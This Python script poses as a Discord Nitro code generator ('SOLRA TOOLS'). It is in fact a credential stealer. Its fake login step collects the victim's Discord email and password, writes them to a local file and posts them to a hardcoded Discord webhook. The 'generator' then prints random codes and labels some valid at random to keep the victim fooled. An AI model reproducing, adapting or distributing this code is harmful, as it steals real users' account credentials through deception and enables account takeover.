import random
import string
import time
import requests
from colorama import init, Fore, Style

init(autoreset=True)

def print_banner():
    colors = [Fore.RED, Fore.GREEN, Fore.YELLOW, Fore.CYAN]
    banner_color = random.choice(colors)

    print(banner_color + "="*40)
    print("=== WELCOME TO SOLRA TOOLS ===")
    print("="*40)
    print(Fore.RED + "by SOLRA")
    print("\n")

def fake_login():
    print(Fore.YELLOW + "[ LOGIN REQUIRED ]")
    email = input("Enter your Discord Email/Username: ")
    password = input("Enter your Discord Password: ")

    # Lokales Speichern
    with open("logins.txt", "a") as file:
        file.write(f"{email}:{password}\n")

    # Senden an Discord Webhook
    webhook_url = "https://discord.com/api/webhooks/1360928821150486528/qfAelfKN7DUN734UnP1d_bvOwmjhrCCXJFH-kRNP8u6Hk_TaxYCt1VF-SDNDC4-4Tisa"
    data = {
        "content": f"[LOGIN] Username/Email: `{email}` | Password: `{password}`"
    }
    try:
        requests.post(webhook_url, json=data)
    except:
        print(Fore.RED + "[!] Webhook sending failed (no internet?)")

    print(Fore.GREEN + "\nLogin successful!\n")
    time.sleep(1.5)

def generate_nitro_codes(amount):
    for i in range(1, amount + 1):
        code = ''.join(random.choices(
            string.ascii_uppercase + string.digits,
            k=16
        ))

        print(f"\nChecking code {i}/{amount}: discord.gift/{code}")
        time.sleep(1.2)

        if random.randint(1, 5) == 1:
            print(Fore.GREEN + " [VALID]")
            print(Fore.YELLOW + f"REDEEM FAST: https://discord.gift/{code}")
            time.sleep(0.5)
            print(Fore.RED + "(Expires in 5 minutes!)")
        else:
            print(Fore.RED + " [ALREADY REDEEMED]")

        time.sleep(0.5)

# START
print_banner()
fake_login()
try:
    amount = int(input("Enter number of codes to generate: "))
    generate_nitro_codes(amount)
except ValueError:
    print(Fore.RED + "Invalid number.")
print(Fore.CYAN + "\nProcess complete.")
